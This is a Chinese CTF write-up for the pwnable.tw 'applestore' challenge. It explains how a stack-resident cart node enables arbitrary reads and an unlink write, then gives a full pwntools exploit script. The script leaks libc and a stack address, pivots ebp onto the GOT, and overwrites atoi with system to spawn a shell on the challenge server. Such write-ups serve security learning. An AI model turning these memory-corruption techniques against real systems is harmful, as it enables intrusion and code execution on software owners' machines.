# [Pwnable.tw] applestore

## 程序逻辑

由ida得到，待补充

## 漏洞点

- checkout中，如果成功获得iphone8，会把iphone8的结构体放在栈上，并链接到链表上，由于这个栈区域在进入`delete/cart`等函数中仍是可以通过`my_read`来覆写的，就可以控制链表上的`iphone8`结构体中的内容

  - 可以通过改变结构体中`name`字段的值来进行任意地址泄露

  - 可以通过链表的unlink操作来对任意地址进行4bytes的写入。如下，由于我们能控制`prev`与`next`的值，最终可以达成`*(prev+8)=next`与`*(next+12) = prev`，可以看出这里的任意写是有副作用的，若我们想要将`prev+8`处的4字节写为`address(system)`，就会将`system+12`处写为`prev`，然而，system处的内存是不可写的，就会导致程序崩溃。因此只能选择两个可写的区域作为`next`和`prev`的取值。

    ```c
    // unlink
    prev = ptr->prev;
    next = ptr->next;
    if (next)
        next->prev = prev;
    if (prev)
        prev->next = next;
    ```

- `my_read`函数使用read函数写入缓冲区，因此可以写多个字符串在缓冲区中

## exploitation

总的思路是修改`GOT['atoi'] = address(system)`。由于unlink的副作用，我们不能使用unlink直接修改GOT表为system的地址。因此，我们需要将ebp劫持到GOT表附近，再通过my_read函数写入got表。

于是有3个任务：

1. 泄露libc地址
2. 劫持ebp
3. 覆写got表

### 泄露libc地址

首先我们需要通过checkout，将栈上的iphone8加入链表。checkout要求达成如下方程：

```python
199*x1 + 299*x2 + 499*x3 + 399*x4 + 199*x5
# x1...x5是每个设备购买的数量
```

这个方程可以直接用z3解

```python
def _solve():
    target_total = 7174
    prices = [199,299,499,399,199]
    cnts = Ints('x0 x1 x2 x3 x4')
    expr = sum(list(map(lambda x,y:x*y, prices,cnts)))
    s = Solver()
    s.add(expr == target_total)
    for sym in cnts:
        s.add(sym > 0)
    s.check()
    sol = s.model()
    print(sol)
    assert sum(map(lambda x,y: sol[x].as_long()*y, cnts, prices))==target_total
    return sol,cnts
```

```python
def get_iphone8(io,sols,cnts):
    for i in range(len(list(cnts))):
        for j in range(sol[cnts[i]].as_long()):
            add(io, i+1)
    choice(io,5)
    io.recvuntil(b"Let me check your cart. ok? (y/n) > ")
    io.sendline(b"y")
```

得到iphone8之后，在cart()中可以通过栈重写来改写iphone8中的name指针，指向`GOT['puts']`即可泄露libc地址。

```python
def leak_libc(io,_bin):
    content = b"y\x00" + p32(_bin.got["puts"]) # change name to GOT['puts']
    content+= p32(114514) + p32(0) 
    cart(io,content)
    s = io.recvuntil(b"114514").split(b"\n")[-1].split(b': ')[1]
    return u32(s[:4])
```

### 劫持ebp

劫持ebp可以通过改写栈上的`saved ebp`，从而在函数结束时改变ebp的值。

改写栈上的地址首先需要泄露栈地址，我们知道购物车链表的表头位于bss段，如果我们能够使得表上只有iphone8一个物品（即如下链表），就会有`cart_head -> next == address(iphone8)`，如果我们这时候再设置`iphone8->name = cart_head->next`，就可以通过打印iphone8的名字来泄露iphone8的地址，为此我们需要delete掉链表上的其它位于堆的物品，再通过栈重写iphone8的name字段。

```python
cart_head <--> address(iphone8)
```

```python
def leak_stack(io):
    for i in range(26):
        delete(io, b"1\x00")
    first_cart_ptr = 0x804B070
    content = b"1\x00"
    content+= p32(first_cart_ptr)   # name
    content+= p32(114514)           # price
    content+= p32(0)                # next
    content+= p32(0)                # prev
    s = delete(io,content)
    assert s.startswith(b"Remove 1:")
    return u32(s.strip(b"Remove 1:")[:4])
```

随后我们通过unlink改写delete函数的`saved ebp`的值到got表。这里需要注意一个问题，由于更改了`saved ebp`，回到main函数之后ebp就会变成got表上的地址，然而main函数会调用别的函数，涉及到栈操作，可能会改变got表项的值，因此需要调整ebp的值到某个位置，既不会影响必要的got表项目，又能够保证之后能够写到`GOT['puts']`。

我们已知`GOT['puts'] = 0x804b040`，因为我们在main函数中栈重写时，开始地址为`ebp-0x22 <= 0x804b040`，因此需要有`ebp <= 0x804b040+0x22`，可以从这个地址每2bytes往下减，找到一个不会crash的地址，我最后找到的地址是`0x804b032+0x22`

```python
def hijack_ebp(io,ori_ebp):
    content = b"1\00"
    got_start = 0x804B032
    content+= p32(got_start)        # name
    content+= p32(0)                # price
    content+= p32(ori_ebp-0xc)      # next
    content+= p32(got_start+0x22)   # prev
    delete(io, content)
```

劫持ebp之后，在main函数里的myread就可以覆写got表了，这里计算好偏移量即可，同时要写`/bin/sh`

```python
def rewrite_got(io,system_addr):
    content = b"/bin/sh\00".ljust(0x40-0x32,b"\x00")
    content+= p32(system_addr)
    io.recvuntil(b"> ")
    io.send(content)
```



脚本如下：

```python
# !/bin/python3
from pwn import *
from z3 import *
import os
import subprocess
context.arch = 'i386'
context.terminal = ["tmux","splitw","-h"]
context.log_level = "debug"

def get_libc_addr(pid):
    cmd = f"cat /proc/{pid}/maps"+" | grep libc | head -1 | awk -F- {'print $1'}"
    addr = int(subprocess.check_output(cmd,shell=True),16) 
    print(hex(addr))
    return addr

def choice(io,ch):
    io.recvuntil(b"> ")
    io.sendline(str(ch).encode())

def add(io,idx):
    choice(io,2)
    io.recvuntil(b"Device Number> ")
    io.sendline(str(idx).encode())

def delete(io,content):
    choice(io,3)
    io.recvuntil(b"Item Number> ")
    io.send(content)
    removed_item = io.recvline()
    return removed_item.strip(b"\n")

def cart(io,content=b"y"):
    choice(io,4)
    io.recvuntil(b"Let me check your cart. ok? (y/n) > ")
    io.send(content)

def get_iphone8(io,sols,cnts):
    for i in range(len(list(cnts))):
        for j in range(sol[cnts[i]].as_long()):
            add(io, i+1)
    choice(io,5)
    io.recvuntil(b"Let me check your cart. ok? (y/n) > ")
    io.sendline(b"y")

def leak_libc(io,_bin):
    content = b"y\x00" + p32(_bin.got["puts"]) # change name to GOT['puts']
    content+= p32(114514) + p32(0) 
    cart(io,content)
    s = io.recvuntil(b"114514").split(b"\n")[-1].split(b': ')[1]
    return u32(s[:4])

def leak_stack(io):
    for i in range(26):
        delete(io, b"1\x00")
    first_cart_ptr = 0x804B070
    content = b"1\x00"
    content+= p32(first_cart_ptr)   # name
    content+= p32(114514)           # price
    content+= p32(0)                # next
    content+= p32(0)                # prev
    s = delete(io,content)
    assert s.startswith(b"Remove 1:")
    return u32(s.strip(b"Remove 1:")[:4])

def hijack_ebp(io,ori_ebp):
    content = b"1\00"
    got_start = 0x804B032
    content+= p32(got_start)        # name
    content+= p32(0)                # price
    content+= p32(ori_ebp-0xc)      # next
    content+= p32(got_start+0x22)   # prev
    delete(io, content)

def rewrite_got(io,system_addr):
    content = b"/bin/sh\00".ljust(0x40-0x32,b"\x00")
    content+= p32(system_addr)
    # delete(io, content)
    # choice(io,3)
    io.recvuntil(b"> ")
    io.send(content)

def demo_stack_rewrite(io):
    content = b"y\x00" + p32(0x080490A4) # change name to "Times Up!"
    content += p32(114514) + p32(0)
    cart(io,content)

def _solve():
    target_total = 7174
    prices = [199,299,499,399,199]
    cnts = Ints('x0 x1 x2 x3 x4')
    expr = sum(list(map(lambda x,y:x*y, prices,cnts)))
    s = Solver()
    s.add(expr == target_total)
    for sym in cnts:
        s.add(sym > 0)
    s.check()
    sol = s.model()
    print(sol)
    assert sum(map(lambda x,y: sol[x].as_long()*y, cnts, prices))==target_total, f"{sum(map(lambda x,y: sol[x].as_long()*y, cnts, prices))}"
    return sol,cnts

DEBUG = False

if __name__ =='__main__':
    if DEBUG:
        io = process("./applestore")
        # get_libc_addr(pidof(io)[0])
    else:
        io = remote("chall.pwnable.tw",10104)
    _bin = ELF("./applestore")
    libc = ELF("./libc_32.so.6")


    sol,cnts = _solve()
    get_iphone8(io,sol,cnts)
    # demo_stack_rewrite(io)
    libc.address = leak_libc(io, _bin) - libc.symbols["puts"] 
    print(f"leaked libc at {hex(libc.address)}")

    delete_ebp = leak_stack(io) + 0x20
    print(f"leaked ebp: {hex(delete_ebp)}")
    #gdb.attach(io, gdbscript="b *0x8048C08\nc\n")
    #sleep(1)
    hijack_ebp(io, delete_ebp)
    
    rewrite_got(io, libc.symbols["system"])

    io.interactive()
```



